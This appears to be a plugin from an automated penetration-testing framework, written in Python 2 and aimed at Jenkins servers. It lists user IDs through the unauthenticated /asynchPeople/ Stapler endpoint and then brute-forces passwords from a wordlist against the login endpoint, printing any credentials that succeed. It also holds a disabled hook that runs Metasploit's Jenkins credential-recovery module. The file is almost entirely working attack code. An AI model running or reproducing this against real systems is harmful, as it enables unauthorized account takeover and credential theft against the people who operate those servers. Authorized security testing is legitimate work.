'''
plugin Jenkins
triggers=Jetty
ports=8080
'''

import os
import sys
import httplib
import re
import urllib, json
import requests
import components.metasploit as metasploit


def metasploitIt(ip_addr,port):

	print "[*] Trying gathering creds on Jenkins "+ip_addr

	msf = metasploit.MSFController()
	msf.connect()
	msf.run('auxiliary/gather/jenkins_cred_recovery', ip_addr, port)

def TryingCreds(ip_addr,port):
	
	print "[*] Recovering users ids..."
 
	url = "http://"+ip_addr+":"+port+"/asynchPeople/"

	params = "[]"
	headers = {	"Content-type":"application/x-stapler-method-invocation", 
				"Cookie":"pmaCookieVer=5;pma_lang=en; pma_collation_connection=utf8_unicode_ci; pma_iv-1=FRrfQ4KBA9hWT8ewQJHDsg%3D%3D; pmaUser-1=FFloTWZRmlZvNrUeixSciw%3D%3D;",}


	conn = httplib.HTTPConnection(ip_addr, port, timeout=10)
	conn.request("GET","/asynchPeople/")
	res = conn.getresponse()

	m = re.search("set-cookie', '(?P<cookie>.*)/;", str(res.getheaders()))
	cookie = m.group('cookie')

	m =  re.search("\$stapler/bound/(?P<id_url>.{36})','(?P<crumb>.{36})", res.read())
	id_url = m.group('id_url')
	crumb = m.group('crumb')


	headers["Crumb"]=  m.group('crumb') 
	headers["Cookie"] += cookie +";"


	conn.request("POST","/$stapler/bound/"+m.group('id_url')+"/start", params, headers)
	res = conn.getresponse()
	res.read()


	conn.request("POST","/$stapler/bound/"+m.group('id_url')+"/news", params, headers)
	res = conn.getresponse()

	if res.status == 200:
		users = []
		json_data = json.loads(res.read())["data"]
		if json_data:
			for row in json_data:
				users.append(str(row['id']))
			print "[+] Users id are : " + str(users)
		else:
			print "[-] User db empty"
	else:
		print "[-] Can't recover usernames"



	if users:

		print "[*] Trying default password with ids on "+ ip_addr

	
		f_passwds = open(os.path.dirname(os.path.realpath(__file__))+ "/wordlists/pass", 'r')

		passwds = f_passwds.read()

		for user in (users):
			#user = user[:-1]
			for pwd in (passwds).split('\n'):
				#pwd =pwd[:-1]


				params = urllib.urlencode({'j_username' :user, 'j_password' :pwd, 'Submit': "Log in", "from": "/", 
					"json" :"{\"j_username\":\""+user+"\",\"j_password\":\""+pwd+"\",\"remember_me\":false,\"from\":\"/\"}"})
				headers["Content-type"] =  "application/x-www-form-urlencoded"
				conn = httplib.HTTPConnection(ip_addr, port, timeout=10)

				conn.request("POST","/j_acegi_security_check", params, headers)
				res = conn.getresponse()

				if res.status == 302 and 'loginError' not in str(res.getheaders()):
					print "[+] Creds found ! "+user+":"+pwd
					print "log Creds found ! "+user+":"+pwd

		print "[*] Trying done."


def main(ip_addr, port):
	try:
		#metasploitIt(ip_addr,port)
		TryingCreds(ip_addr,port)
	except Exception as e:
		print e

if __name__ == '__main__':
	main(sys.argv[1], sys.argv[2])
